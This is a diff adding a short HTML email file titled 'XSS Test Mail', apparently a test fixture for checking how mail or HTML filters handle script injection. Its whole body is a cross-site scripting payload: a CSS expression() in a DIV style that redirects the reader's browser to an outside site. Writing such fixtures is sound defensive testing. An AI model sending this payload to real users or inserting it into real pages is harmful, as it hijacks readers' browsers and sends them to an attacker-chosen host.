@@ -1,0 +1,7 @@
+From: "Monica Malta" <momalta@cict.fiocruz.br>
+To: gary.weiss@enron.com, mary.sullivan@enron.com, steven.meyers@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<DIV STYLE="width: expression((window.r==1)?'':(window.r=1,window.location.href='http://tools88.com/'));">
